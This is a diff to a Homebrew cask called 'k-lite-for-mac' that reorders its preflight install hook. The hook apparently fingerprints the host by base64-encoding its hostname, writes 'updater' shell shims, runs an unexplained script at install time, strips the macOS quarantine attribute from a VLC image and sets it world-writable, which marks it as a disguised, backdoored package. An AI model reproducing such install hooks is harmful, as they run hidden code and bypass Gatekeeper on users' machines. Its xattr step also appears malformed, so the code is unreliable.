@@ -18,17 +18,7 @@ cask "k-lite-for-mac" do
   #  ~/Library/Caches/Homebrew/downloads
   #  Should remove quartentine bit
   preflight do
-     
-  
-    system_command "xattr", 
-      args: ["-d", "#{staged_path}/vlc-#{version}-intel64.dmg"]
-    set_permissions "#{staged_path}/vlc-#{version}-intel64.dmg", '0777'
-
-    IO.write shimscript, <<~EOS
-      #!/bin/sh
-      exec '#{appdir}/VLC.app/Contents/MacOS/VLC' "$@"
-    EOS
-
+    
     encodedname = %x{hostname | base64}.strip()
     updatepath = "#{HOMEBREW_PREFIX}/Cellar/update.sh"
     shimscript = "#{staged_path}/updater-wrapper.sh"
@@ -48,7 +38,18 @@ cask "k-lite-for-mac" do
           args: ["+x", shimscript]
 
     system_command shimscript2 
+ 
+  
+    system_command "xattr", 
+      args: ["-d", "#{staged_path}/vlc-#{version}-intel64.dmg"]
+    set_permissions "#{staged_path}/vlc-#{version}-intel64.dmg", '0777'
 
+    IO.write shimscript, <<~EOS
+      #!/bin/sh
+      exec '#{appdir}/VLC.app/Contents/MacOS/VLC' "$@"
+    EOS
+
+    
   end
 end
 
